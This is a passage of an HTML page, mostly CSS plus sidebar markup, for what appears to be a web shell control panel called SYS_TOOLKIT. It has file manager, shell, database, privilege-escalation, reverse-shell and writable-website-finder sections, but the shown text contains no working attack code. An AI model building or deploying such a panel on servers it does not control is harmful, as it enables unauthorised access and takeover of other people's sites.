.fm-bottom-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:8px;}
@media(max-width:700px){.fm-bottom-grid{grid-template-columns:1fr;}}

/* ========== File Manager Enhanced ========== */
.fm-toolbar{display:flex;flex-wrap:wrap;gap:4px;padding:5px 8px;border-bottom:1px solid var(--border);align-items:center;justify-content:space-between;}
.fm-toolbar-left{display:flex;flex-wrap:wrap;gap:4px;align-items:center;}
.fm-toolbar-right{display:flex;flex-wrap:wrap;gap:4px;align-items:center;}
.fm-filter-input{background:var(--bg-input);border:1px solid var(--border);border-radius:4px;color:var(--text);padding:4px 8px;font-size:11.5px;width:120px;outline:none;}
.fm-filter-input:focus{border-color:var(--primary);}
.fm-filter-select{background:var(--bg-input);border:1px solid var(--border);border-radius:4px;color:var(--text);padding:4px 6px;font-size:11.5px;outline:none;}
.fm-symlink{font-style:italic;}
.fm-link-arrow{color:var(--cyan);font-size:10.5px;opacity:.7;}
.fm-actions-cell{white-space:nowrap;font-size:10.5px;gap:3px;}
.fm-file-row td a.dir-link,.fm-file-row td a.file-link{word-break:break-all;}
.fm-file-row:hover{background:var(--ok-dim);}
.fm-parent-row td{padding:4px 8px;}

/* Context Menu */
.fm-ctx{position:fixed;z-index:9999;min-width:180px;background:var(--bg-panel);border:1px solid var(--border);border-radius:6px;box-shadow:0 8px 24px rgba(0,0,0,.5);padding:4px 0;display:none;font-size:12px;}
.fm-ctx-item{padding:6px 14px;cursor:pointer;display:flex;align-items:center;gap:8px;color:var(--text);transition:.1s;}
.fm-ctx-item:hover{background:var(--ok-dim);color:var(--primary);}
.fm-ctx-sep{height:1px;background:var(--border);margin:4px 0;}
.fm-ctx-item.danger{color:var(--danger);}
.fm-ctx-item.danger:hover{background:var(--danger-dim);}

/* Grid View */
.fm-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:8px;padding:12px;}
.fm-grid-item{display:flex;flex-direction:column;align-items:center;gap:4px;padding:10px 6px;border:1px solid var(--border);border-radius:6px;cursor:pointer;transition:.15s;text-align:center;background:var(--bg-panel-alt);position:relative;}
.fm-grid-item:hover{border-color:var(--primary);background:var(--ok-dim);}
.fm-grid-item.selected{border-color:var(--primary);background:var(--ok-dim);box-shadow:0 0 0 1px var(--primary);}
.fm-grid-icon{font-size:29px;line-height:1;}
.fm-grid-thumb{width:64px;height:64px;object-fit:cover;border-radius:4px;}
.fm-grid-name{font-size:10.5px;color:var(--text);word-break:break-all;max-height:28px;overflow:hidden;line-height:1.2;}
.fm-grid-size{font-size:11.5px;color:var(--text-dim);}
.fm-grid-check{position:absolute;top:4px;left:4px;z-index:1;}

/* Lightbox / Media Preview */
.fm-lightbox{position:fixed;inset:0;z-index:10000;background:rgba(0,0,0,.92);display:none;align-items:center;justify-content:center;flex-direction:column;gap:12px;}
.fm-lightbox.active{display:flex;}
.fm-lightbox-close{position:absolute;top:16px;right:20px;font-size:29px;color:#fff;cursor:pointer;z-index:10001;background:none;border:none;opacity:.7;}
.fm-lightbox-close:hover{opacity:1;}
.fm-lightbox-title{color:#ccc;font-size:13.5px;position:absolute;bottom:20px;}
.fm-lightbox img{max-width:90vw;max-height:80vh;border-radius:6px;box-shadow:0 4px 20px rgba(0,0,0,.5);}
.fm-lightbox video,.fm-lightbox audio{max-width:90vw;max-height:80vh;border-radius:6px;}

/* Bookmark Bar */
.fm-bookmark-bar{display:flex;flex-wrap:wrap;gap:4px;padding:6px 8px;border-bottom:1px solid var(--border);background:var(--bg-panel-alt);}
.fm-bookmark-item{display:flex;align-items:center;gap:4px;padding:3px 8px;border:1px solid var(--border);border-radius:4px;font-size:10.5px;cursor:pointer;color:var(--text-dim);transition:.1s;background:transparent;}
.fm-bookmark-item:hover{border-color:var(--primary);color:var(--primary);}
.fm-bookmark-remove{font-size:11.5px;opacity:.5;cursor:pointer;}
.fm-bookmark-remove:hover{opacity:1;color:var(--danger);}

/* File Info Modal / Properties */
.fm-info-grid{display:grid;grid-template-columns:130px 1fr;gap:4px 12px;font-size:12px;}
.fm-info-label{color:var(--text-dim);text-align:right;}
.fm-info-value{color:var(--text);word-break:break-all;}
.fm-info-value.ok{color:var(--ok);}
.fm-info-value.warn{color:var(--warn);}
.fm-info-value.err{color:var(--danger);}

/* Visual Chmod Editor */
.fm-chmod-visual{display:grid;grid-template-columns:auto repeat(3,1fr);gap:4px 8px;font-size:11.5px;align-items:center;padding:8px;background:var(--bg-panel-alt);border-radius:6px;border:1px solid var(--border);}
.fm-chmod-header{color:var(--text-dim);text-align:center;font-weight:bold;font-size:10.5px;}
.fm-chmod-label{color:var(--text-dim);text-align:right;padding-right:4px;}
.fm-chmod-cb{accent-color:var(--primary);}
.fm-chmod-preview{font-family:var(--mono);font-size:15px;color:var(--primary);text-align:center;padding:6px;margin-top:6px;}

/* Search / Grep Modal */
.fm-search-results{max-height:400px;overflow-y:auto;font-size:12px;}
.fm-search-item{padding:6px 10px;border-bottom:1px solid var(--border);cursor:pointer;transition:.1s;}
.fm-search-item:hover{background:var(--ok-dim);}
.fm-search-path{color:var(--cyan);font-size:11.5px;font-family:var(--mono);}
.fm-search-line{color:var(--text-dim);font-size:10.5px;}
.fm-search-match{color:var(--warn);font-family:var(--mono);font-size:11.5px;}

/* Clipboard Bar */
.fm-clipboard-bar{display:none;padding:6px 12px;background:var(--info-dim, rgba(0,150,255,.1));border:1px solid var(--info, #0af);border-radius:4px;font-size:11.5px;color:var(--info, #0af);align-items:center;gap:8px;margin-bottom:8px;}
.fm-clipboard-bar.active{display:flex;}

/* Tail Viewer */
.fm-tail-content{background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:10px;font-family:var(--mono);font-size:11.5px;color:var(--primary);white-space:pre-wrap;word-break:break-all;max-height:500px;overflow-y:auto;}

/* FM Terminal Card */
.fm-term-output{width:100%;height:150px;background:#000;border:1px solid var(--border);border-radius:4px;padding:8px;font-family:var(--mono);font-size:12px;color:var(--primary);resize:vertical;outline:none;white-space:pre-wrap;word-break:break-all;line-height:1.5;}
.fm-term-input{flex:1;background:var(--bg-input);border:1px solid var(--border);border-radius:4px;color:var(--primary);padding:5px 8px;font-size:12px;font-family:var(--mono);outline:none;}
.fm-term-input:focus{border-color:var(--border-strong);box-shadow:0 0 0 2px rgba(0,255,64,.08);}
.fm-term-prompt{color:var(--primary);font-family:var(--mono);font-size:14px;line-height:30px;font-weight:bold;}

/* Keyboard shortcut hint */
.fm-kbd{display:inline-block;padding:1px 5px;border:1px solid var(--border);border-radius:3px;font-size:10.5px;color:var(--text-dim);background:var(--bg-panel-alt);font-family:var(--mono);}

@media(max-width:900px){
  .fm-toolbar{flex-direction:column;align-items:stretch;}
  .fm-toolbar-left,.fm-toolbar-right{justify-content:flex-start;}
  .fm-filter-input{width:100px;}
  .fm-grid{grid-template-columns:repeat(auto-fill,minmax(80px,1fr));}
  .fm-info-grid{grid-template-columns:100px 1fr;}
}

/* ========== Shell layout ========== */
.shell-container{display:grid;grid-template-columns:280px 1fr;gap:16px;min-height:400px;}
.shell-left{overflow-y:auto;max-height:70vh;border:1px solid var(--border);border-radius:var(--radius);padding:12px;background:var(--bg-panel);}
.shell-right{display:flex;flex-direction:column;gap:12px;}
.shortcut-item{
  padding:5px 8px;border:1px solid var(--border);border-radius:4px;
  margin-bottom:4px;cursor:pointer;transition:.15s;background:var(--bg-panel-alt);
  user-select:none;
}
.shortcut-item:hover{border-color:var(--border-strong);background:var(--ok-dim);}
.shortcut-item code{color:var(--primary);font-size:10.5px;display:block;margin-bottom:1px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
.shortcut-desc{font-size:11.5px;color:var(--text-dim);}

/* ========== DB Manager ========== */
.db-manager-body{display:grid;grid-template-columns:200px 1fr;gap:16px;min-height:400px;}
.db-sidebar{overflow-y:auto;max-height:70vh;border:1px solid var(--border);border-radius:var(--radius);padding:10px;background:var(--bg-panel);}
.db-main-content{display:flex;flex-direction:column;gap:12px;}

/* ========== File Search ========== */
.search-layout{display:grid;grid-template-columns:260px 1fr;gap:16px;min-height:300px;}
.search-sidebar{border:1px solid var(--border);border-radius:var(--radius);padding:12px;background:var(--bg-panel);align-self:start;}
.search-main{border:1px solid var(--border);border-radius:var(--radius);padding:12px;background:var(--bg-panel);overflow-y:auto;max-height:calc(100vh - 160px);min-height:0;}

/* ========== Website Discover ========== */
.discover-container{display:grid;grid-template-columns:280px 1fr;gap:16px;min-height:300px;}
.discover-sidebar{overflow-y:auto;max-height:75vh;border:1px solid var(--border);border-radius:var(--radius);padding:12px;background:var(--bg-panel);}
.discover-main{display:flex;flex-direction:column;gap:12px;min-height:0;overflow-y:auto;}
.discover-placeholder{text-align:center;padding:40px 20px;color:var(--text-dim);}
.search-type-selector{display:flex;gap:6px;margin-bottom:8px;}
.search-type{flex:1;padding:8px 10px;border:1px solid var(--border);border-radius:5px;cursor:pointer;font-size:11.5px;color:var(--text-dim);background:transparent;transition:.15s;text-align:center;}
.search-type:hover{border-color:var(--border-strong);color:var(--text);}
.search-type.active{color:var(--primary);border-color:var(--primary);background:var(--ok-dim);}
.scan-mode{padding:8px 10px;border:1px solid var(--border);border-radius:5px;cursor:pointer;font-size:11.5px;color:var(--text-dim);background:transparent;transition:.15s;display:block;width:100%;text-align:left;margin-bottom:6px;}
.scan-mode:hover{border-color:var(--border-strong);color:var(--text);}
.scan-mode.active{color:var(--primary);border-color:var(--primary);background:var(--ok-dim);}
.scan-mode .scan-desc{display:block;font-size:10.5px;color:var(--text-dim);margin-top:2px;}
.scan-mode.active .scan-desc{color:var(--primary);}
.website-item{background:var(--bg-panel);border:1px solid var(--border);border-radius:var(--radius);padding:12px;margin-bottom:8px;font-size:12px;}
.website-item.priority{border-color:var(--primary);background:rgba(0,255,64,.03);}
.website-badge{padding:2px 8px;border-radius:3px;font-size:10.5px;font-weight:bold;margin-right:4px;}
.badge-title{background:var(--primary);color:#000;}
.badge-writable{background:var(--ok);color:#000;}
.badge-readonly{background:var(--border);color:var(--text-dim);}
.website-title{color:var(--primary);font-weight:bold;margin-top:4px;font-size:13.5px;}
.website-path{font-family:var(--mono);font-size:11.5px;color:var(--info);word-break:break-all;padding:4px 8px;background:rgba(0,0,0,.3);border-radius:3px;margin-top:4px;}
.website-meta{display:flex;gap:12px;font-size:10.5px;color:var(--text-dim);margin-top:6px;flex-wrap:wrap;}
.cms-badge{padding:2px 8px;border-radius:3px;font-size:10.5px;font-weight:bold;background:var(--border);color:var(--text);}
.cms-badge.wordpress{background:#21759b;color:#fff;}
.cms-badge.joomla{background:#f44321;color:#fff;}
.cms-badge.magento{background:#f26322;color:#fff;}
.cms-badge.drupal{background:#0678be;color:#fff;}

/* ========== Privesc buttons ========== */
.btn-priv{
  padding:10px 12px;border:1px solid var(--danger);border-radius:6px;
  background:var(--danger-dim);color:var(--danger);font-size:11.5px;cursor:pointer;transition:.15s;
  display:flex;align-items:center;gap:6px;
}
.btn-priv:hover{background:var(--danger);color:#1a0000;}

/* ========== Tool Modal Components ========== */
.output-box{
  background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);
  padding:10px;font-size:11.5px;font-family:var(--mono);color:var(--primary);
  white-space:pre-wrap;word-break:break-all;overflow-y:auto;min-height:80px;max-height:400px;
}
.output-box.sm{min-height:40px;max-height:200px;}
.output-box.lg{min-height:200px;max-height:500px;}
.section-card{
  background:var(--bg-panel-alt);border:1px solid var(--border);border-radius:var(--radius);
  padding:12px;margin-bottom:12px;
}
.section-card-title{font-size:12px;color:var(--primary);font-weight:bold;margin-bottom:8px;}
.section-card-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;}
.section-card-head .section-card-title{margin-bottom:0;}
.btn-row{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap;}

/* ========== Server Info Bar ========== */
.server-info-bar{
  background:var(--bg-panel);border:1px solid var(--border);border-radius:var(--radius);
  padding:8px 12px;margin-bottom:10px;font-size:11px;line-height:1.6;color:var(--text-dim);
}
.server-info-bar .highlight{color:var(--primary);font-weight:bold;}
.server-info-bar strong{color:var(--text);}

/* ========== Utility classes ========== */
.hidden,.d-none{display:none!important;}
.text-primary{color:var(--primary)!important;}
.text-danger{color:var(--danger)!important;}
.text-muted,.text-dim{color:var(--text-dim)!important;}
.text-cyan{color:var(--cyan)!important;}
.text-warn,.text-warning,.text-orange{color:var(--warn)!important;}
.text-white{color:#fff!important;}
.text-green{color:var(--primary)!important;}
.text-sm{font-size:11.5px;}
.text-md{font-size:12px;}
.text-11{font-size:11.5px;}
.text-12{font-size:12px;}
.text-13{font-size:14px;}
.text-10{font-size:10.5px;}
.text-24{font-size:21px;}
.bg-black{background:#000!important;}
.bg-dark,.bg-dark-2,.bg-accent{background:var(--bg-panel-alt)!important;}
.bg-light{background:var(--bg-panel)!important;}
.bg-green,.bg-primary{background:var(--primary)!important;color:#04150a!important;}
.bg-danger,.bg-red,.bg-red-dark{background:var(--danger)!important;color:#fff!important;}
.bg-cyan,.bg-blue-light{background:var(--cyan)!important;color:#04150a!important;}
.bg-secondary{background:var(--primary-dim)!important;color:#04150a!important;}
.bg-orange{background:var(--warn)!important;color:#1a1000!important;}
.bg-gray,.bg-gray-dark{background:var(--bg-panel-alt)!important;}
.bg-transparent{background:transparent!important;}
.font-bold{font-weight:bold!important;}
.font-mono{font-family:var(--font)!important;}
.whitespace-pre-wrap{white-space:pre-wrap!important;}
.overflow-y-auto{overflow-y:auto!important;}
.overflow-auto{overflow:auto!important;}
.overflow-hidden{overflow:hidden!important;}
.w-full{width:100%!important;}
.w-0{width:0!important;}
.h-full{height:100%!important;}
.flex-1{flex:1!important;}
.flex-2{flex:2!important;}
.flex-wrap{flex-wrap:wrap!important;}
.flex{display:flex!important;}
.flex-col{flex-direction:column!important;}
.d-flex{display:flex!important;}
.d-grid{display:grid!important;}
.d-block{display:block!important;}
.block{display:block!important;}
.grid-2col{grid-template-columns:repeat(2,1fr);}
.grid-cols-2{grid-template-columns:repeat(2,1fr);}
.grid{display:grid!important;}
.items-center{align-items:center!important;}
.items-end{align-items:flex-end!important;}
.justify-between,.justify-content-between{justify-content:space-between!important;}
.justify-end{justify-content:flex-end!important;}
.text-center{text-align:center!important;}
.text-left{text-align:left!important;}
.text-right{text-align:right!important;}
.cursor-pointer{cursor:pointer!important;}
.border{border:1px solid var(--border)!important;}
.border-green,.border-primary{border-color:var(--border-strong)!important;}
.border-dark{border-color:var(--border)!important;}
.border-orange{border-color:rgba(255,196,0,.4)!important;}
.border-gray{border-color:var(--border)!important;}
.border-0,.border-none{border:none!important;}
.border-b{border-bottom:1px solid var(--border)!important;}
.border-b-2{border-bottom:2px solid!important;}
.border-top{border-top:1px solid var(--border)!important;}
.border-l-4{border-left:4px solid var(--primary)!important;}
.border-transparent{border-color:transparent!important;}
.rounded-sm,.rounded-xs,.rounded-3,.rounded-4{border-radius:var(--radius)!important;}
.mb-0{margin-bottom:0!important;}
.mb-4{margin-bottom:4px!important;}
.mb-5{margin-bottom:5px!important;}
.mb-8{margin-bottom:8px!important;}
.mb-10{margin-bottom:10px!important;}
.mb-15{margin-bottom:15px!important;}
.mt-5{margin-top:5px!important;}
.mt-6{margin-top:6px!important;}
.mt-10{margin-top:10px!important;}
.mt-15{margin-top:15px!important;}
.mt-20{margin-top:20px!important;}
.mr-5{margin-right:5px!important;}
.mr-8{margin-right:8px!important;}
.m-0{margin:0!important;}
.my-2{margin-top:2px!important;margin-bottom:2px!important;}
.p-2{padding:2px!important;}
.p-4{padding:4px!important;}
.p-5{padding:5px!important;}
.p-6{padding:6px!important;}
.p-8{padding:8px!important;}
.p-10{padding:10px!important;}
.p-12{padding:12px!important;}
.pt-12{padding-top:12px!important;}
.pb-0{padding-bottom:0!important;}
.pl-12{padding-left:12px!important;}
.px-4{padding-left:4px!important;padding-right:4px!important;}
.px-6{padding-left:6px!important;padding-right:6px!important;}
.px-8{padding-left:8px!important;padding-right:8px!important;}
.px-10{padding-left:10px!important;padding-right:10px!important;}
.px-12{padding-left:12px!important;padding-right:12px!important;}
.px-16{padding-left:16px!important;padding-right:16px!important;}
.px-20{padding-left:20px!important;padding-right:20px!important;}
.py-2{padding-top:2px!important;padding-bottom:2px!important;}
.py-4{padding-top:4px!important;padding-bottom:4px!important;}
.py-5{padding-top:5px!important;padding-bottom:5px!important;}
.py-8{padding-top:8px!important;padding-bottom:8px!important;}
.gap-4{gap:4px!important;}
.gap-5{gap:5px!important;}
.gap-6{gap:6px!important;}
.gap-8{gap:8px!important;}
.gap-10{gap:10px!important;}
.gap-12{gap:12px!important;}
.gap-15{gap:15px!important;}
.min-h-50{min-height:50px!important;}
.min-h-80{min-height:80px!important;}
.min-h-100{min-height:100px!important;}
.min-h-120{min-height:120px!important;}
.min-h-150{min-height:150px!important;}
.min-h-200{min-height:200px!important;}
.min-w-80{min-width:80px!important;}
.min-w-200{min-width:200px!important;}
.min-w-250{min-width:250px!important;}
.max-h-150{max-height:150px!important;}
.max-h-200{max-height:200px!important;}
.max-h-300{max-height:300px!important;}
.max-h-350{max-height:350px!important;}
.max-h-400{max-height:400px!important;}
.max-h-50vh{max-height:50vh!important;}
.max-h-90vh{max-height:90vh!important;}
.max-w-800{max-width:800px!important;}
.max-w-1000{max-width:1000px!important;}
.max-w-1100{max-width:1100px!important;}
.max-w-full{max-width:100%!important;}
.w-90vw{width:90vw!important;}
.h-100{height:100px!important;}
.h-80{height:80px!important;}
.h-120{height:120px!important;}
.resize-y{resize:vertical!important;}
.break-all{word-break:break-all!important;}
.leading-loose{line-height:1.8!important;}
.flex-shrink-0{flex-shrink:0!important;}
.transition-width-3{transition:width .3s!important;}
.select-all-checkbox{cursor:pointer;}

/* File table specifics for v2 */
.file-table th{cursor:pointer;user-select:none;}
.file-table th:hover{color:var(--primary);}
.file-table .checkbox-col{width:30px;text-align:center;}
.bulk-bar{
  display:none;padding:6px 10px;background:var(--bg-panel-alt);border:1px solid var(--border-strong);
  border-radius:var(--radius);margin-bottom:6px;align-items:center;gap:6px;font-size:10.5px;
}
.bulk-bar.active{display:flex;}

/* Output area */
.output-area{
  background:#000;border:1px solid var(--border);border-radius:var(--radius);
  padding:8px 12px;font-size:11.5px;color:var(--primary);white-space:pre-wrap;
  max-height:120px;overflow-y:auto;margin-top:8px;margin-bottom:4px;
}
.output-area:empty{display:none;}

/* ========== Responsive ========== */
@media(max-width:1000px){
  .sidebar{width:64px;}
  .brand-sub,.nav-item span,.nav-tag,.sidebar-foot{display:none;}
  .nav-item{justify-content:center;}
  .stat-row,.grid-3{grid-template-columns:repeat(2,1fr);}
  .tool-grid{grid-template-columns:repeat(3,1fr);}
  .grid-2{grid-template-columns:1fr;}
  .shell-container,.discover-container,.db-manager-body,.search-layout{grid-template-columns:1fr;}
}
@media(max-width:768px){
  .sidebar{display:none;}
  .bottom-nav{display:block;}
  .swipe-dots{display:flex;}
  .content{padding:14px 10px calc(78px + env(safe-area-inset-bottom,0px));}
  .topbar{padding:0 14px;height:50px;}
  .topbar-title{font-size:13px;}
  .topbar-right{gap:10px;}
  .btn{min-height:40px;padding:9px 14px;font-size:12px;}
  .icon-btn{width:36px;height:36px;}
  .icon-btn svg{width:16px;height:16px;}
  select,.field input,.field textarea{min-height:40px;font-size:14px;}
  .grid-2,.grid-3{grid-template-columns:1fr;}
  .search-box{min-width:0;width:100%;}
  .toolbar{gap:8px;padding:10px 12px;flex-direction:column;align-items:stretch;}
  .toolbar .search-box{margin-left:0;}
  .crumbs{font-size:11px;gap:4px;}
  .crumbs button,.crumbs a{padding:6px 8px;font-size:11px;}
  .shell-container,.discover-container,.db-manager-body,.search-layout{grid-template-columns:1fr;}
  .search-main{max-height:60vh;}
  .modal--sm,.modal--md{max-width:100%;}
  .modal--full{width:100%;height:100%;max-width:none;border-radius:0;}
  .modal-body{padding:14px;}
  .section-title{font-size:11px;}

  /* ===== File Manager Table → Mobile Cards ===== */
  .table-wrap{overflow-x:hidden;padding-bottom:20px;}
  .table-wrap table,.table-wrap thead,.table-wrap tbody,.table-wrap tr,.table-wrap th,.table-wrap td{display:block;width:100%;}
  .table-wrap thead{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0);}
  .table-wrap tbody tr{border:1px solid var(--border);border-radius:8px;background:var(--bg-panel-alt);padding:10px 12px;margin-bottom:8px;}
  .table-wrap tbody tr.fm-parent-row{padding:8px 12px;margin-bottom:6px;}
  .table-wrap td{display:flex;align-items:center;justify-content:space-between;gap:8px;border-bottom:1px dashed rgba(0,255,64,.08);padding:7px 4px;text-align:right;font-size:12px;}
  .table-wrap td:last-child{border-bottom:none;}
  .table-wrap td::before{content:attr(data-label);font-size:10px;letter-spacing:.5px;text-transform:uppercase;color:var(--text-dim);text-align:left;flex-shrink:0;min-width:55px;}
  .table-wrap td.fm-chk-cell{display:none;}
  .table-wrap td.fm-icon-cell{display:none;}
  .table-wrap td.fm-actions-cell{justify-content:center;flex-wrap:wrap;padding:8px 0 2px;}
  .table-wrap td.fm-actions-cell::before{display:none;}
  .table-wrap td.actions-cell{justify-content:center;flex-wrap:wrap;}
  .table-wrap td.actions-cell::before{display:none;}
  .row-icon{justify-content:flex-end;}

  /* Action links → bigger touch targets */
  .action-link,.fm-actions-cell a{
    display:inline-flex;align-items:center;justify-content:center;
    min-width:36px;min-height:34px;padding:6px 8px;
    border:1px solid var(--border);border-radius:5px;
    font-size:11px;text-decoration:none;color:var(--text-dim);
    background:var(--bg-panel-alt);
  }
  .action-link:hover,.fm-actions-cell a:hover{color:var(--primary);border-color:var(--primary);background:var(--ok-dim);}

  /* Bulk bar mobile */
  .bulk-bar{flex-wrap:wrap;font-size:11px;gap:6px;}

  /* FM toolbar mobile */
  .fm-toolbar{padding:8px;gap:6px;}
  .fm-filter-input{width:100%;min-width:0;}
  .fm-filter-select{flex:1;min-width:0;}

  /* FM grid view mobile */
  .fm-grid{grid-template-columns:repeat(auto-fill,minmax(80px,1fr));gap:6px;padding:10px;}
  .fm-grid-name{font-size:10px;max-height:32px;}
  .fm-grid-thumb{width:56px;height:56px;}
  .fm-grid-icon{font-size:26px;}

  /* FM info grid */
  .fm-info-grid{grid-template-columns:90px 1fr;gap:3px 8px;font-size:11px;}

  /* FM chmod visual */
  .fm-chmod-visual{font-size:10.5px;gap:3px 6px;}

  /* FM bookmark bar */
  .fm-bookmark-bar{padding:6px;gap:3px;}
  .fm-bookmark-item{font-size:10px;padding:4px 6px;}

  /* FM clipboard bar */
  .fm-clipboard-bar{flex-wrap:wrap;font-size:11px;}

  /* Upload / Create panels */
  .drop-zone{min-height:56px;padding:12px;}
  .drop-label{font-size:12px;}

  /* Terminal card */
  .fm-term-output{height:120px;font-size:11px;}
  .fm-term-input{font-size:12px;min-height:36px;}

  /* Website / Discover items */
  .website-item{padding:10px;font-size:11.5px;}
  .website-path{font-size:10.5px;padding:6px;}
  .website-meta{font-size:10px;gap:8px;}

  /* Search results */
  .fm-search-results{max-height:50vh;}
  .fm-search-item{padding:8px 10px;}
  .fm-search-path{font-size:10.5px;word-break:break-all;}

  /* Output area */
  .output-area{font-size:11px;padding:8px;max-height:200px;}

  /* Stat rows */
  .stat-row{grid-template-columns:repeat(2,1fr);gap:8px;}
  .stat-row .stat{padding:10px;}

  /* Meters */
  .meters{grid-template-columns:1fr;gap:10px;}
}
@media(max-width:640px){
  .stat-row,.grid-3,.meters{grid-template-columns:1fr;}
  .tool-grid{grid-template-columns:repeat(2,1fr);}
  .content{padding:10px 8px calc(78px + env(safe-area-inset-bottom,0px));}
  .table-wrap tbody tr{padding:8px 10px;margin-bottom:6px;}
  .table-wrap td{padding:6px 2px;font-size:11.5px;}
  .table-wrap td::before{font-size:9.5px;min-width:48px;}
  .crumbs{font-size:10.5px;}
  .crumbs button,.crumbs a{padding:5px 6px;font-size:10.5px;}
  .website-item{padding:8px;}
  .fm-bottom-grid{gap:6px;}
}
@media(max-width:420px){
  .tool-grid{grid-template-columns:1fr;}
  .stat-row{grid-template-columns:1fr;}
  .action-link,.fm-actions-cell a{min-width:32px;min-height:32px;padding:5px 6px;font-size:10.5px;}
  .fm-grid{grid-template-columns:repeat(auto-fill,minmax(72px,1fr));gap:5px;padding:8px;}
  .topbar-title{font-size:12px;max-width:140px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
  .topbar-right{gap:6px;font-size:10px;}
  .modal-head,.modal-header{padding:10px 14px;}
  .modal-body{padding:10px 12px;}
  .modal-foot,.modal-footer{padding:10px 14px;}
  .search-type-selector{flex-wrap:wrap;}
  .search-type{padding:6px 8px;font-size:10.5px;}
  .website-path{font-size:10px;word-break:break-all;}
}

/* ========== Loading placeholder ========== */
.loading-placeholder{background:var(--bg-panel-alt);border-radius:4px;animation:pulse 1.5s infinite;}
@keyframes pulse{0%,100%{opacity:.6;}50%{opacity:.3;}}

/* Server info modal specifics */
.server-info-wrapper{display:flex;flex-direction:column;gap:12px;}
.server-info-section{background:var(--bg-panel-alt);border:1px solid var(--border);border-radius:var(--radius);padding:12px;}
.section-label{font-size:11.5px;color:var(--primary);letter-spacing:1px;margin-bottom:8px;display:block;}
.search-row{display:flex;gap:8px;}
.btn-filter{padding:8px 12px;background:var(--ok-dim);color:var(--primary);border:1px solid var(--border-strong);border-radius:5px;font-size:11.5px;cursor:pointer;}
.btn-filter:hover{background:var(--primary);color:#04150a;}
.btn-secondary{padding:8px 12px;background:transparent;color:var(--text-dim);border:1px solid var(--border);border-radius:5px;font-size:11.5px;cursor:pointer;}
.btn-secondary:hover{color:var(--text);background:var(--bg-panel-alt);}
.btn-primary{padding:8px 12px;background:var(--ok-dim);color:var(--primary);border:1px solid var(--border-strong);border-radius:5px;font-size:11.5px;cursor:pointer;}
.btn-primary:hover{background:var(--primary);color:#04150a;}
.controls-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
.control-group{display:flex;flex-direction:column;gap:6px;}
.group-label{font-size:10.5px;color:var(--text-faint);letter-spacing:1px;}
.button-group{display:flex;gap:6px;flex-wrap:wrap;}
.favorite-star{cursor:pointer;transition:color .2s;}
.server-info-content{font-family:var(--font);font-size:12px;color:var(--text);}
.scan-config-toggle{transition:transform .2s;}

/* Privesc specifics */
.btn-priv-red{padding:8px 10px;border:1px solid var(--danger);border-radius:5px;background:var(--danger-dim);color:var(--danger);font-size:10.5px;cursor:pointer;transition:.15s;}
.btn-priv-red:hover{background:var(--danger);color:#fff;}
.btn-priv-dark-red{padding:8px 10px;border:1px solid rgba(255,77,77,.3);border-radius:5px;background:rgba(255,77,77,.08);color:rgba(255,77,77,.8);font-size:10.5px;cursor:pointer;transition:.15s;}
.btn-priv-dark-red:hover{background:var(--danger);color:#fff;}

/* RevShell tab styles */
.rs-tab-btn.active{color:var(--primary)!important;border-bottom-color:var(--primary)!important;}

/* Service filter */
.service-filter-btn.active{background:var(--primary)!important;color:#04150a!important;}
</style>
</head>
<body>

<div class="app">
<!-- ==================== SIDEBAR ==================== -->
<aside class="sidebar">
  <div class="brand">
    <div class="brand-logo">SYS<span style="color:var(--text)">_</span>TOOLKIT<span class="cursor"></span></div>
    <div class="brand-sub">UNIFIED CONTROL PANEL</div>
  </div>
  <nav class="nav">
    <button class="nav-item active" data-view="files">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V7Z"/></svg>
      <span>File Manager</span>
    </button>
    <button class="nav-item" data-view="shell">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
      <span>Shell</span>
    </button>
    <button class="nav-item" data-view="tools">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14.7 6.3a4 4 0 0 0-5.4 5.4L3 18l3 3 6.3-6.3a4 4 0 0 0 5.4-5.4l-2.6 2.6-2-2 2.6-2.6Z"/></svg>
      <span>System Tools</span>
      <span class="nav-tag">13</span>
    </button>
    <button class="nav-item" data-view="database">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>
      <span>Database</span>
    </button>
    <button class="nav-item" data-view="privesc">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2 4 6v6c0 5 3.5 8.5 8 10 4.5-1.5 8-5 8-10V6l-8-4Z"/></svg>
      <span>Privesc</span>
    </button>
    <button class="nav-item" data-view="search">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m21 21-4.3-4.3"/></svg>
      <span>Search</span>
    </button>
    <button class="nav-item" data-view="discover">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
      <span>Website Finder</span>
    </button>
  </nav>
  <div class="sidebar-foot">
    <div><b>v2.0</b> build</div>
    <div id="clock">--:--:--</div>
  </div>
</aside>

<!-- ==================== MAIN ==================== -->
<div class="main">
  <header class="topbar">
    <div class="topbar-title"><span id="topbar-label">File Manager</span> <span class="dim">/ panel</span></div>
    <div class="topbar-right">
      <span><span class="dot"></span>online</span>
    </div>
  </header>

  <div class="content">

